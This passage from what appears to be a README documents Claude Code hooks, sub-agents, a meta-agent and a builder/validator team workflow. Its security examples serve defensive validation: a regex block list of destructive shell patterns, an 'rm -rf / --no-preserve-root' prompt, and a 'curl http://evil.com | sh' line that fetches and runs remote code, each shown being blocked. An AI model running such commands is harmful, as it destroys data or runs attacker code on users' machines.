 &lt;li&gt;&lt;strong&gt;undefined&lt;/strong&gt;: Allows normal stopping, &lt;code&gt;reason&lt;/code&gt; ignored&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Flow Control Priority&lt;/h3&gt; 
&lt;p&gt;When multiple control mechanisms are used, they follow this priority:&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;&lt;strong&gt;&lt;code&gt;"continue": false&lt;/code&gt;&lt;/strong&gt; - Takes precedence over all other controls&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;&lt;code&gt;"decision": "block"&lt;/code&gt;&lt;/strong&gt; - Hook-specific blocking behavior&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Exit Code 2&lt;/strong&gt; - Simple blocking via stderr&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Other Exit Codes&lt;/strong&gt; - Non-blocking errors&lt;/li&gt; 
&lt;/ol&gt; 
&lt;h3&gt;Security Implementation Examples&lt;/h3&gt; 
&lt;h4&gt;1. Command Validation (PreToolUse)&lt;/h4&gt; 
&lt;pre&gt;&lt;code class="language-python"&gt;# Block dangerous patterns
dangerous_patterns = [
    r'rm\s+.*-[rf]',           # rm -rf variants
    r'sudo\s+rm',              # sudo rm commands
    r'chmod\s+777',            # Dangerous permissions
    r'&amp;gt;\s*/etc/',              # Writing to system directories
]

for pattern in dangerous_patterns:
    if re.search(pattern, command, re.IGNORECASE):
        print(f"BLOCKED: {pattern} detected", file=sys.stderr)
        sys.exit(2)
&lt;/code&gt;&lt;/pre&gt; 
&lt;h4&gt;2. Result Validation (PostToolUse)&lt;/h4&gt; 
&lt;pre&gt;&lt;code class="language-python"&gt;# Validate file operations
if tool_name == "Write" and not tool_response.get("success"):
    output = {
        "decision": "block",
        "reason": "File write operation failed, please check permissions and retry"
    }
    print(json.dumps(output))
    sys.exit(0)
&lt;/code&gt;&lt;/pre&gt; 
&lt;h4&gt;3. Completion Validation (Stop Hook)&lt;/h4&gt; 
&lt;pre&gt;&lt;code class="language-python"&gt;# Ensure critical tasks are complete
if not all_tests_passed():
    output = {
        "decision": "block",
        "reason": "Tests are failing. Please fix failing tests before completing."
    }
    print(json.dumps(output))
    sys.exit(0)
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Hook Execution Environment&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Timeout&lt;/strong&gt;: 60-second execution limit per hook&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Parallelization&lt;/strong&gt;: All matching hooks run in parallel&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Environment&lt;/strong&gt;: Inherits Claude Code's environment variables&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Working Directory&lt;/strong&gt;: Runs in current project directory&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Input&lt;/strong&gt;: JSON via stdin with session and tool data&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Output&lt;/strong&gt;: Processed via stdout/stderr with exit codes&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;UserPromptSubmit Hook Deep Dive&lt;/h2&gt; 
&lt;p&gt;The UserPromptSubmit hook is the first line of defense and enhancement for Claude Code interactions. It fires immediately when you submit a prompt, before Claude even begins processing it.&lt;/p&gt; 
&lt;h3&gt;What It Can Do&lt;/h3&gt; 
&lt;ol&gt; 
 &lt;li&gt;&lt;strong&gt;Log prompts&lt;/strong&gt; - Records every prompt with timestamp and session ID&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Block prompts&lt;/strong&gt; - Exit code 2 prevents Claude from seeing the prompt&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Add context&lt;/strong&gt; - Print to stdout adds text before your prompt that Claude sees&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Validate content&lt;/strong&gt; - Check for dangerous patterns, secrets, policy violations&lt;/li&gt; 
&lt;/ol&gt; 
&lt;h3&gt;How It Works&lt;/h3&gt; 
&lt;ol&gt; 
 &lt;li&gt;&lt;strong&gt;You type a prompt&lt;/strong&gt; ‚Üí Claude Code captures it&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;UserPromptSubmit hook fires&lt;/strong&gt; ‚Üí Receives JSON with your prompt&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Hook processes&lt;/strong&gt; ‚Üí Can log, validate, block, or add context&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Claude receives&lt;/strong&gt; ‚Üí Either blocked message OR original prompt + any context&lt;/li&gt; 
&lt;/ol&gt; 
&lt;h3&gt;Example Use Cases&lt;/h3&gt; 
&lt;h4&gt;1. Audit Logging&lt;/h4&gt; 
&lt;p&gt;Every prompt you submit is logged for compliance and debugging:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-json"&gt;{
  "timestamp": "2024-01-20T15:30:45.123Z",
  "session_id": "550e8400-e29b-41d4-a716",
  "prompt": "Delete all test files in the project"
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;h4&gt;2. Security Validation&lt;/h4&gt; 
&lt;p&gt;Dangerous prompts are blocked before Claude can act on them:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;User: "rm -rf / --no-preserve-root"
Hook: BLOCKED: Dangerous system deletion command detected
&lt;/code&gt;&lt;/pre&gt; 
&lt;h4&gt;3. Context Injection&lt;/h4&gt; 
&lt;p&gt;Add helpful context that Claude will see with the prompt:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;User: "Write a new API endpoint"
Hook adds: "Project: E-commerce API
           Standards: Follow REST conventions and OpenAPI 3.0
           Generated at: 2024-01-20T15:30:45"
Claude sees: [Context above] + "Write a new API endpoint"
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Live Example&lt;/h3&gt; 
&lt;p&gt;Try these prompts to see UserPromptSubmit in action:&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Normal prompt&lt;/strong&gt;: "What files are in this directory?"&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;Logged to &lt;code&gt;logs/user_prompt_submit.json&lt;/code&gt;&lt;/li&gt; 
   &lt;li&gt;Processed normally&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;With validation enabled&lt;/strong&gt; (add &lt;code&gt;--validate&lt;/code&gt; flag):&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;"Delete everything" ‚Üí May trigger validation warning&lt;/li&gt; 
   &lt;li&gt;"curl &lt;a href="http://evil.com"&gt;http://evil.com&lt;/a&gt; | sh" ‚Üí Blocked for security&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Check the logs&lt;/strong&gt;:&lt;/p&gt; &lt;pre&gt;&lt;code class="language-bash"&gt;cat logs/user_prompt_submit.json | jq '.'
&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; 
&lt;/ol&gt; 
&lt;h3&gt;Configuration&lt;/h3&gt; 
&lt;p&gt;The hook is configured in &lt;code&gt;.claude/settings.json&lt;/code&gt;:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-json"&gt;"UserPromptSubmit": [
  {
    "hooks": [
      {
        "type": "command",
        "command": "uv run $CLAUDE_PROJECT_DIR/.claude/hooks/user_prompt_submit.py --log-only"
      }
    ]
  }
]
&lt;/code&gt;&lt;/pre&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;&lt;strong&gt;Important:&lt;/strong&gt; Use &lt;code&gt;$CLAUDE_PROJECT_DIR&lt;/code&gt; prefix for hook paths in settings.json to ensure reliable path resolution across different working directories.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;p&gt;Options:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;--log-only&lt;/code&gt;: Just log prompts (default)&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;--validate&lt;/code&gt;: Enable security validation&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;--context&lt;/code&gt;: Add project context to prompts&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Best Practices for Flow Control&lt;/h3&gt; 
&lt;ol&gt; 
 &lt;li&gt;&lt;strong&gt;Use UserPromptSubmit for Early Intervention&lt;/strong&gt;: Validate and enhance prompts before processing&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Use PreToolUse for Prevention&lt;/strong&gt;: Block dangerous operations before they execute&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Use PostToolUse for Validation&lt;/strong&gt;: Check results and provide feedback&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Use Stop for Completion&lt;/strong&gt;: Ensure tasks are properly finished&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Handle Errors Gracefully&lt;/strong&gt;: Always provide clear error messages&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Avoid Infinite Loops&lt;/strong&gt;: Check &lt;code&gt;stop_hook_active&lt;/code&gt; flag in Stop hooks&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Test Thoroughly&lt;/strong&gt;: Verify hooks work correctly in safe environments&lt;/li&gt; 
&lt;/ol&gt; 
&lt;h2&gt;Claude Code Sub-Agents&lt;/h2&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;Watch &lt;a href="https://youtu.be/7B2HJr0Y68g"&gt;this YouTube video&lt;/a&gt; to see how to create and use Claude Code sub-agents effectively.&lt;/p&gt; 
 &lt;p&gt;See the &lt;a href="https://docs.anthropic.com/en/docs/claude-code/sub-agents"&gt;Claude Code Sub-Agents documentation&lt;/a&gt; for more details.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;img src="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/images/subagents.png" alt="Claude Code Sub-Agents" style="max-width: 800px; width: 100%;" /&gt; 
&lt;p&gt;Claude Code supports specialized sub-agents that handle specific tasks with custom system prompts, tools, and separate context windows. Sub-agents are AI assistants that your primary Claude Code agent can delegate tasks to.&lt;/p&gt; 
&lt;h3&gt;Understanding Sub-Agents: System Prompts, Not User Prompts&lt;/h3&gt; 
&lt;p&gt;&lt;strong&gt;Critical Concept&lt;/strong&gt;: The content in agent files (&lt;code&gt;.claude/agents/*.md&lt;/code&gt;) are &lt;strong&gt;system prompts&lt;/strong&gt; that configure the sub-agent's behavior. They are NOT user prompts. This is the #1 misunderstanding when creating agents.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Information Flow&lt;/strong&gt;:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;You (User) ‚Üí Primary Agent ‚Üí Sub-Agent ‚Üí Primary Agent ‚Üí You (User)
&lt;/code&gt;&lt;/pre&gt; 
&lt;img src="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/images/SubAgentFlow.gif" alt="Sub-Agent Information Flow" style="max-width: 800px; width: 100%;" /&gt; 
&lt;ol&gt; 
 &lt;li&gt;&lt;strong&gt;You&lt;/strong&gt; make a request to Claude Code (primary agent)&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Primary Agent&lt;/strong&gt; analyzes your request and delegates to appropriate sub-agent&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Sub-Agent&lt;/strong&gt; executes task using its system prompt instructions&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Sub-Agent&lt;/strong&gt; reports results back to primary agent&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Primary Agent&lt;/strong&gt; synthesizes and presents results to you&lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;&lt;strong&gt;Key Points&lt;/strong&gt;:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Sub-agents NEVER communicate directly with you&lt;/li&gt; 
 &lt;li&gt;Sub-agents start fresh with no conversation history&lt;/li&gt; 
 &lt;li&gt;Sub-agents respond to the primary agent's prompt, not yours&lt;/li&gt; 
 &lt;li&gt;The &lt;code&gt;description&lt;/code&gt; field tells the primary agent WHEN to use the sub-agent&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Agent Storage &amp;amp; Organization&lt;/h3&gt; 
&lt;p&gt;This repository demonstrates various agent configurations:&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Project Agents&lt;/strong&gt; (&lt;code&gt;.claude/agents/&lt;/code&gt;):&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;.claude/agents/
‚îú‚îÄ‚îÄ crypto/                    # Cryptocurrency analysis agents
‚îÇ   ‚îú‚îÄ‚îÄ crypto-coin-analyzer-haiku.md
‚îÇ   ‚îú‚îÄ‚îÄ crypto-coin-analyzer-opus.md
‚îÇ   ‚îú‚îÄ‚îÄ crypto-coin-analyzer-sonnet.md
‚îÇ   ‚îú‚îÄ‚îÄ crypto-investment-plays-*.md
‚îÇ   ‚îú‚îÄ‚îÄ crypto-market-agent-*.md
‚îÇ   ‚îú‚îÄ‚îÄ crypto-movers-haiku.md
‚îÇ   ‚îî‚îÄ‚îÄ macro-crypto-correlation-scanner-*.md
‚îú‚îÄ‚îÄ hello-world-agent.md       # Simple greeting agent
‚îú‚îÄ‚îÄ llm-ai-agents-and-eng-research.md  # AI research specialist
‚îú‚îÄ‚îÄ meta-agent.md              # Agent that creates agents
‚îî‚îÄ‚îÄ work-completion-summary.md # Audio summary generator
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Storage Hierarchy&lt;/strong&gt;:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Project agents&lt;/strong&gt;: &lt;code&gt;.claude/agents/&lt;/code&gt; (higher priority, project-specific)&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;User agents&lt;/strong&gt;: &lt;code&gt;~/.claude/agents/&lt;/code&gt; (lower priority, available across all projects)&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Format&lt;/strong&gt;: Markdown files with YAML frontmatter&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;strong&gt;Agent File Structure:&lt;/strong&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-yaml"&gt;---
name: agent-name
description: When to use this agent (critical for automatic delegation)
tools: Tool1, Tool2, Tool3  # Optional - inherits all tools if omitted
color: Cyan  # Visual identifier in terminal
model: opus # Optional - haiku | sonnet | opus - defaults to sonnet
---

# Purpose
You are a [role definition]. 

## Instructions
1. Step-by-step instructions
2. What the agent should do
3. How to report results

## Report/Response Format
Specify how the agent should communicate results back to the primary agent.
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Sub-agents enable:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Task specialization&lt;/strong&gt; - Code reviewers, debuggers, test runners&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Context preservation&lt;/strong&gt; - Each agent operates independently&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Tool restrictions&lt;/strong&gt; - Grant only necessary permissions&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Automatic delegation&lt;/strong&gt; - Claude proactively uses the right agent&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Key Engineering Insights&lt;/h3&gt; 
&lt;p&gt;&lt;strong&gt;Two Critical Mistakes to Avoid:&lt;/strong&gt;&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Misunderstanding the System Prompt&lt;/strong&gt; - What you write in agent files is the &lt;em&gt;system prompt&lt;/em&gt;, not a user prompt. This changes how you structure instructions and what information is available to the agent.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Ignoring Information Flow&lt;/strong&gt; - Sub-agents respond to your primary agent, not to you. Your primary agent prompts sub-agents based on your original request, and sub-agents report back to the primary agent, which then reports to you.&lt;/p&gt; &lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;&lt;strong&gt;Best Practices:&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Use the &lt;code&gt;description&lt;/code&gt; field to tell your primary agent &lt;em&gt;when&lt;/em&gt; and &lt;em&gt;how&lt;/em&gt; to prompt sub-agents&lt;/li&gt; 
 &lt;li&gt;Include phrases like "use PROACTIVELY" or trigger words (e.g., "if they say TTS") in descriptions&lt;/li&gt; 
 &lt;li&gt;Remember sub-agents start fresh with no context - be explicit about what they need to know&lt;/li&gt; 
 &lt;li&gt;Follow Problem ‚Üí Solution ‚Üí Technology approach when building agents&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Complex Workflows &amp;amp; Agent Chaining&lt;/h3&gt; 
&lt;p&gt;Claude Code can intelligently chain multiple sub-agents together for complex tasks:&lt;/p&gt; 
&lt;img src="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/images/SubAgentChain.gif" alt="Sub-Agent Chaining" style="max-width: 800px; width: 100%;" /&gt; 
&lt;p&gt;For example:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;"First analyze the market with crypto-market-agent, then use crypto-investment-plays to find opportunities"&lt;/li&gt; 
 &lt;li&gt;"Use the debugger agent to fix errors, then have the code-reviewer check the changes"&lt;/li&gt; 
 &lt;li&gt;"Generate a new agent with meta-agent, then test it on a specific task"&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;This chaining allows you to build sophisticated workflows while maintaining clean separation of concerns.&lt;/p&gt; 
&lt;h3&gt;The Meta-Agent&lt;/h3&gt; 
&lt;p&gt;The meta-agent (&lt;code&gt;.claude/agents/meta-agent.md&lt;/code&gt;) is a specialized sub-agent that generates new sub-agents from descriptions. It's the "agent that builds agents" - a critical tool for scaling your agent development velocity.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Why Meta-Agent Matters:&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Rapid Agent Creation&lt;/strong&gt; - Build dozens of specialized agents in minutes instead of hours&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Consistent Structure&lt;/strong&gt; - Ensures all agents follow best practices and proper formatting&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Live Documentation&lt;/strong&gt; - Pulls latest Claude Code docs to stay current with features&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Intelligent Tool Selection&lt;/strong&gt; - Automatically determines minimal tool requirements&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;strong&gt;Using the Meta-Agent:&lt;/strong&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;# Simply describe what you want
"Build a new sub-agent that runs tests and fixes failures"

# Claude Code will automatically delegate to meta-agent
# which will create a properly formatted agent file
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;The meta-agent follows the principle: "Figure out how to scale it up. Build the thing that builds the thing." This compound effect accelerates your engineering capabilities exponentially.&lt;/p&gt; 
&lt;h2&gt;Team-Based Validation System&lt;/h2&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;&lt;strong&gt;Watch the walkthrough:&lt;/strong&gt; See agent teams and the &lt;code&gt;/plan_w_team&lt;/code&gt; workflow in action at &lt;a href="https://youtu.be/4_2j5wgt_ds"&gt;https://youtu.be/4_2j5wgt_ds&lt;/a&gt;&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;img src="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/images/cctask.png" alt="Claude Code Task System" style="max-width: 800px; width: 100%;" /&gt; 
&lt;p&gt;This repository includes a powerful build/validate workflow pattern using the Claude Code task system to orchestrate specialized agent teams.&lt;/p&gt; 
&lt;h3&gt;The &lt;code&gt;/plan_w_team&lt;/code&gt; Meta Prompt&lt;/h3&gt; 
&lt;p&gt;The &lt;code&gt;/plan_w_team&lt;/code&gt; command (&lt;code&gt;.claude/commands/plan_w_team.md&lt;/code&gt;) is not an ordinary prompt‚Äîit has three powerful components:&lt;/p&gt; 
&lt;h4&gt;1. Self-Validating&lt;/h4&gt; 
&lt;p&gt;The prompt includes embedded hooks in its front matter that validate its own output:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-yaml"&gt;hooks:
  stop:
    - command: "uv run $CLAUDE_PROJECT_DIR/.claude/hooks/validators/validate_new_file.py specs/*.md"
    - command: "uv run $CLAUDE_PROJECT_DIR/.claude/hooks/validators/validate_file_contains.py"
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;After the planning agent finishes, these validators ensure:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;A spec file was created in the correct directory&lt;/li&gt; 
 &lt;li&gt;The file contains required sections (team orchestration, step-by-step tasks, etc.)&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;If validation fails, the agent receives feedback and continues working until the output meets criteria.&lt;/p&gt; 
&lt;h4&gt;2. Agent Orchestration&lt;/h4&gt; 
&lt;p&gt;The prompt leverages Claude Code's task system to build and coordinate agent teams:&lt;/p&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;Task Tool&lt;/th&gt; 
   &lt;th&gt;Purpose&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;code&gt;TaskCreate&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Create new tasks with owners, descriptions, dependencies&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;code&gt;TaskUpdate&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Update status, add blockers, communicate completion&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;code&gt;TaskList&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;View all tasks and their current state&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;code&gt;TaskGet&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Retrieve full task details&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;p&gt;&lt;strong&gt;How it works:&lt;/strong&gt;&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;Primary agent creates a task list with specific owners (builder/validator)&lt;/li&gt; 
 &lt;li&gt;Tasks can run in parallel or have dependency blockers&lt;/li&gt; 
 &lt;li&gt;Subagents complete work and ping back to the primary agent&lt;/li&gt; 
 &lt;li&gt;Primary agent reacts in real-time as work completes&lt;/li&gt; 
 &lt;li&gt;Blocked tasks automatically unblock when dependencies finish&lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;This enables longer-running threads of work because the task system handles coordination‚Äîno bash sleep loops needed.&lt;/p&gt; 
&lt;h4&gt;3. Templating&lt;/h4&gt; 
&lt;p&gt;&lt;code&gt;/plan_w_team&lt;/code&gt; is a &lt;strong&gt;template meta prompt&lt;/strong&gt;‚Äîa prompt that generates prompts in a specific, vetted format:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-markdown"&gt;## Plan Format (embedded in the meta prompt)

### {{PLAN_NAME}}
**Task:** {{TASK_DESCRIPTION}}
**Objective:** {{OBJECTIVE}}

### Team Orchestration
{{TEAM_MEMBERS}}

### Step-by-Step Tasks
{{TASKS}}
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;The generated plan follows your engineering patterns exactly. This is the difference between agentic engineering and "vibe coding"‚Äîyou know the outcome your agent will generate because you've templated the format.&lt;/p&gt; 
&lt;h3&gt;Team Agents&lt;/h3&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;Agent&lt;/th&gt; 
   &lt;th&gt;File&lt;/th&gt; 
   &lt;th&gt;Tools&lt;/th&gt; 
   &lt;th&gt;Self-Validation&lt;/th&gt; 
   &lt;th&gt;Purpose&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;Builder&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;team/builder.md&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;All tools&lt;/td&gt; 
   &lt;td&gt;Ruff + Ty on .py files&lt;/td&gt; 
   &lt;td&gt;Execute implementation tasks, build the thing&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;Validator&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;team/validator.md&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Read-only (no Write/Edit)&lt;/td&gt; 
   &lt;td&gt;None&lt;/td&gt; 
   &lt;td&gt;Verify builder's work meets acceptance criteria&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;p&gt;This two-agent pairing increases compute to increase trust that work was delivered correctly.&lt;/p&gt; 
&lt;h3&gt;Code Quality Validators&lt;/h3&gt; 
&lt;p&gt;PostToolUse validators automatically enforce code quality:&lt;/p&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;Validator&lt;/th&gt; 
   &lt;th&gt;File&lt;/th&gt; 
   &lt;th&gt;Trigger&lt;/th&gt; 
   &lt;th&gt;Action&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;Ruff&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;ruff_validator.py&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Write/Edit on .py files&lt;/td&gt; 
   &lt;td&gt;Blocks on lint errors&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;Ty&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;ty_validator.py&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Write/Edit on .py files&lt;/td&gt; 
   &lt;td&gt;Blocks on type errors&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;h3&gt;Workflow Example&lt;/h3&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;# 1. Create a plan with team orchestration
/plan_w_team

# User prompt: "Update the hooks documentation and add missing status lines"
# Orchestration prompt: "Create groups of agents for each hook, one builder and one validator"

# 2. Plan is generated with:
#    - Team members (session_end_builder, session_end_validator, etc.)
#    - Step-by-step tasks with dependencies
#    - Validation commands

# 3. Execute the plan
/build

# 4. Watch agents work in parallel:
#    - Builders implement features
#    - Validators verify completion
#    - Task system coordinates everything
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Configuration&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;ruff.toml&lt;/code&gt; - Ruff linter rules&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;ty.toml&lt;/code&gt; - Type checker settings&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;.claude/agents/team/&lt;/code&gt; - Team agent definitions&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Output Styles Collection&lt;/h2&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;&lt;strong&gt;Watch the walkthrough:&lt;/strong&gt; See these features in action at &lt;a href="https://youtu.be/mJhsWrEv-Go"&gt;https://youtu.be/mJhsWrEv-Go&lt;/a&gt;&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;img src="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/images/genui.png" alt="GenUI Output Style" style="max-width: 800px; width: 100%;" /&gt; 
&lt;p&gt;This project includes a comprehensive collection of custom output styles (&lt;code&gt;.claude/output-styles/&lt;/code&gt;) that transform how Claude Code communicates responses. See the &lt;a href="https://docs.anthropic.com/en/docs/claude-code/output-styles"&gt;official documentation&lt;/a&gt; for complete details on how output styles work.&lt;/p&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;Style&lt;/th&gt; 
   &lt;th&gt;Description&lt;/th&gt; 
   &lt;th&gt;Best For&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;genui&lt;/strong&gt; ‚≠ê&lt;/td&gt; 
   &lt;td&gt;&lt;strong&gt;Generates beautiful HTML with embedded styling&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;strong&gt;Interactive visual outputs, instant browser preview&lt;/strong&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;table-based&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Organizes all information in markdown tables&lt;/td&gt; 
   &lt;td&gt;Comparisons, structured data, status reports&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;yaml-structured&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Formats responses as YAML configuration&lt;/td&gt; 
   &lt;td&gt;Settings, hierarchical data, API responses&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
